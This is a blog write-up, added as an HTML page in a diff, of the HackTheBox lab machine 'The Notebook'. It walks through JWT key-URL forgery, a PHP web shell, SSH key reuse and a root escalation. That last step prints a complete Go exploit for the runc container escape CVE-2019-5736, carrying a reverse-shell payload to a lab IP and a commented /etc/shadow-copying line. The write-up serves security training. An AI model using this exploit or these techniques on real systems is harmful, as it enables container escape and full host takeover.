@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>The Notebook - HackTheBox machine :: RoundofThree</title>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content=" Rank: medium " name="description"/>
+<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
+<meta content="noodp" name="robots"/>
+<link href="/labs/the_notebook/" rel="canonical"/>
+<link href="/assets/style.css" rel="stylesheet"/>
+<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
+<link href="/favicon.png" rel="shortcut icon"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="" name="twitter:site"/>
+<meta content="RoundofThree" name="twitter:creator"/>
+<meta content="en" property="og:locale"/>
+<meta content="article" property="og:type"/>
+<meta content="The Notebook - HackTheBox machine" property="og:title"/>
+<meta content=" Rank: medium " property="og:description"/>
+<meta content="/labs/the_notebook/" property="og:url"/>
+<meta content="RoundofThree" property="og:site_name"/>
+<meta content="/favicon.png" property="og:image"/>
+<meta content="2048" property="og:image:width"/>
+<meta content="1024" property="og:image:height"/>
+<meta content="2021-09-07 13:20:07 +0200 +0200" property="article:published_time"/>
+</head>
+<body class="orange">
+<div class="container center headings--one-size">
+<header class="header">
+<div class="header__inner">
+<div class="header__logo">
+<a href="/">
+<div class="logo">
+    RoundofThree
+  </div>
+</a>
+</div>
+<div class="menu-trigger">menu</div>
+</div>
+<nav class="menu">
+<ul class="menu__inner menu__inner--desktop">
+<li><a href="/general">General</a></li>
+<li><a href="/labs">Labs</a></li>
+<li><a href="/research">Research</a></li>
+<li><a href="/">Whoami</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href="/general">General</a></li>
+<li><a href="/labs">Labs</a></li>
+<li><a href="/research">Research</a></li>
+<li><a href="/">Whoami</a></li>
+</ul>
+</nav>
+</header>
+<form action="/search/" id="search" method="get">
+<label for="search-input" hidden="">Search site</label>
+<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
+<input type="submit" value="search"/>
+</form>
+<div class="content">
+<div class="post">
+<h1 class="post-title">
+<a href="/labs/the_notebook/">The Notebook - HackTheBox machine</a></h1>
+<div class="post-meta">
+<span class="post-date">
+        2021-09-07 
+      </span>
+<span class="post-author">:: RoundofThree</span>
+</div>
+<span class="post-tags">
+    
+    #<a href="/tags/hackthebox/">HackTheBox</a> 
+    
+  </span>
+<div class="post-content"><div>
+<ul>
+<li>Rank: medium</li>
+</ul>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
+<p>1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.</p>
+<p>2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called ‘admin’.</p>
+<p>3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">Header:</span>
+{
+  <span style="color:#f92672">"typ"</span>: <span style="color:#e6db74">"JWT"</span>,
+  <span style="color:#f92672">"alg"</span>: <span style="color:#e6db74">"RS256"</span>,
+  <span style="color:#f92672">"kid"</span>: <span style="color:#e6db74">"http://localhost:7070/privKey.key"</span>  <span style="color:#960050;background-color:#1e0010">&lt;-</span> <span style="color:#960050;background-color:#1e0010">private</span> <span style="color:#960050;background-color:#1e0010">key</span> 
+}
+<span style="color:#960050;background-color:#1e0010">Payload:</span>
+{
+  <span style="color:#f92672">"username"</span>: <span style="color:#e6db74">"anna"</span>,
+  <span style="color:#f92672">"email"</span>: <span style="color:#e6db74">"anna@gmail.com"</span>,
+  <span style="color:#f92672">"admin_cap"</span>: <span style="color:#ae81ff">0</span>  <span style="color:#960050;background-color:#1e0010">&lt;--</span> <span style="color:#960050;background-color:#1e0010">change</span> <span style="color:#960050;background-color:#1e0010">to</span> <span style="color:#ae81ff">1</span>
+}
+</code></pre></div><p>4- So I need access to the private key. Or I can change the ‘kid’ field to my own IP.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">openssl genrsa -out privKey.key <span style="color:#ae81ff">4028</span>
+python3 -m http.server <span style="color:#ae81ff">7070</span>
+</code></pre></div><p>5- There are interesting notes in Admin panel.</p>
+<ul>
+<li>Need to fix config. PHP can be executed.</li>
+<li>There are backup tasks.</li>
+<li>There is a user named noah.</li>
+</ul>
+<p>6- Upload a PHP pw0ny shell and view it to remote code execution.</p>
+<p>7- Download backup of home tarball and use the .ssh id_rsa to ssh into noah session. -&gt; user.txt get!</p>
+<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
+<p>8- sudo -l to find access to sudo docker exec -it webapp-dev01 ANY COMMAND</p>
+<p>9- Use this PoC CVE-2019-5736 in main.go to get a reverse shell from root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#75715e">// Implementation of CVE-2019-5736
+</span><span style="color:#75715e">// Created with help from @singe, @_cablethief, and @feexd.
+</span><span style="color:#75715e">// This commit also helped a ton to understand the vuln
+</span><span style="color:#75715e">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+</span><span style="color:#75715e"></span><span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">"fmt"</span>
+	<span style="color:#e6db74">"io/ioutil"</span>
+	<span style="color:#e6db74">"os"</span>
+	<span style="color:#e6db74">"strconv"</span>
+	<span style="color:#e6db74">"strings"</span>
+)
+
+<span style="color:#75715e">// This is the line of shell commands that will execute on the host
+</span><span style="color:#75715e">// var payload = "#!/bin/bash \n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> = <span style="color:#e6db74">"#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.14.129/9999 0&gt;&amp;1"</span>
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+	<span style="color:#75715e">// First we overwrite /bin/sh with the /proc/self/exe interpreter path
+</span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">"/bin/sh"</span>)
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+		<span style="color:#66d9ef">return</span>
+	}
+	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprintln</span>(<span style="color:#a6e22e">fd</span>, <span style="color:#e6db74">"#!/proc/self/exe"</span>)
+	<span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">fd</span>.<span style="color:#a6e22e">Close</span>()
+	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+		<span style="color:#66d9ef">return</span>
+	}
+	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">"[+] Overwritten /bin/sh successfully"</span>)
+
+	<span style="color:#75715e">// Loop through all processes to find one whose cmdline includes runcinit
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">// This will be the process created by runc
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">found</span> <span style="color:#66d9ef">int</span>
+	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">found</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+		<span style="color:#a6e22e">pids</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadDir</span>(<span style="color:#e6db74">"/proc"</span>)
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+			<span style="color:#66d9ef">return</span>
+		}
+		<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">f</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">pids</span> {
+			<span style="color:#a6e22e">fbytes</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#e6db74">"/proc/"</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Name</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">"/cmdline"</span>)
+			<span style="color:#a6e22e">fstring</span> <span style="color:#f92672">:=</span> string(<span style="color:#a6e22e">fbytes</span>)
+			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">Contains</span>(<span style="color:#a6e22e">fstring</span>, <span style="color:#e6db74">"runc"</span>) {
+				<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">"[+] Found the PID:"</span>, <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Name</span>())
+				<span style="color:#a6e22e">found</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Name</span>())
+				<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+					<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">err</span>)
+					<span style="color:#66d9ef">return</span>
+				}
+			}
+		}
+	}
+
+	<span style="color:#75715e">// We will use the pid to get a file handle for runc on the host.
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">handleFd</span> = <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">handleFd</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
+		<span style="color:#75715e">// Note, you do not need to use the O_PATH flag for the exploit to work.
+</span><span style="color:#75715e"></span>		<span style="color:#a6e22e">handle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">OpenFile</span>(<span style="color:#e6db74">"/proc/"</span><span style="color:#f92672">+</span><span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Itoa</span>(<span style="color:#a6e22e">found</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">"/exe"</span>, <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">O_RDONLY</span>, <span style="color:#ae81ff">0777</span>)
+		<span style="color:#66d9ef">if</span> int(<span style="color:#a6e22e">handle</span>.<span style="color:#a6e22e">Fd</span>()) &gt; <span style="color:#ae81ff">0</span> {
+			<span style="color:#a6e22e">handleFd</span> = int(<span style="color:#a6e22e">handle</span>.<span style="color:#a6e22e">Fd</span>())
+		}
+	}
+	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">"[+] Successfully got the file handle"</span>)
+
+	<span style="color:#75715e">// Now that we have the file handle, lets write to the runc binary and overwrite it
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">// It will maintain it's executable flag
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> {
+		<span style="color:#a6e22e">writeHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">OpenFile</span>(<span style="color:#e6db74">"/proc/self/fd/"</span><span style="color:#f92672">+</span><span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Itoa</span>(<span style="color:#a6e22e">handleFd</span>), <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">O_WRONLY</span>|<span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">O_TRUNC</span>, <span style="color:#ae81ff">0700</span>)
+		<span style="color:#66d9ef">if</span> int(<span style="color:#a6e22e">writeHandle</span>.<span style="color:#a6e22e">Fd</span>()) &gt; <span style="color:#ae81ff">0</span> {
+			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">"[+] Successfully got write handle"</span>, <span style="color:#a6e22e">writeHandle</span>)
+			<span style="color:#a6e22e">writeHandle</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#a6e22e">payload</span>))
+			<span style="color:#66d9ef">return</span>
+		}
+	}
+}
+</code></pre></div>
+</div></div>
+</div>
+</div>
+<footer class="footer">
+<div class="footer__inner">
+<div class="copyright copyright--user">
+<span>© 2021 RoundofThree</span>
+</div>
+</div>
+</footer>
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+</div>
+</body>
+</html>
